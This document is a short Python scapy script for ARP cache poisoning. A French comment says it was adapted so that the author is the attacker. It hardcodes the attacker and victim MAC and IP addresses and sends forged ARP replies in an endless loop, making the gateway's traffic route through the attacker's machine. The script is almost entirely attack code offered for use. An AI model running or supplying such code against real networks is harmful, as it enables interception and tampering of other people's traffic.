from scapy.all import *

'''Code réajuster pour que ce soit moi l'attaquant.'''

def arp_poison(victim_ip, victim_mac, router_ip):
    # Get your own MAC address (attacker's MAC)
    attacker_mac = "90:e8:68:15:ac:43"
    
    # Create an Ethernet frame with the destination MAC as the victim's MAC
    ethernet = Ether(dst=victim_mac)
    
    # Create an ARP response saying that your MAC address (attacker_mac) is the router (router_ip)
    arp_response = ARP(pdst=victim_ip, hwdst=victim_mac, psrc=router_ip, hwsrc=attacker_mac, op='is-at')
    
    # Combine the Ethernet frame and the ARP response
    packet = ethernet / arp_response

    # Send the ARP response packet in a loop to keep poisoning the victim's ARP cache
    while True:
        sendp(packet, verbose=0)


target_ip = "172.20.10.5"  # IP of the victim
target_mac = "b8:1e:a4:6c:56:97"  # MAC of the victim
spoof_ip = "172.20.10.1"  # IP you want to spoof (usually the gateway)

target_ip2 = "172.20.10.1"  # IP of the victim
target_mac2 = "62:d0:39:f1:3f:64"  # MAC of the victim
spoof_ip2 = "172.20.10.5"  # IP you want to spoof (usually the gateway)

arp_poison(target_ip, target_mac, spoof_ip)
arp_poison(target_ip2, target_mac2, spoof_ip2)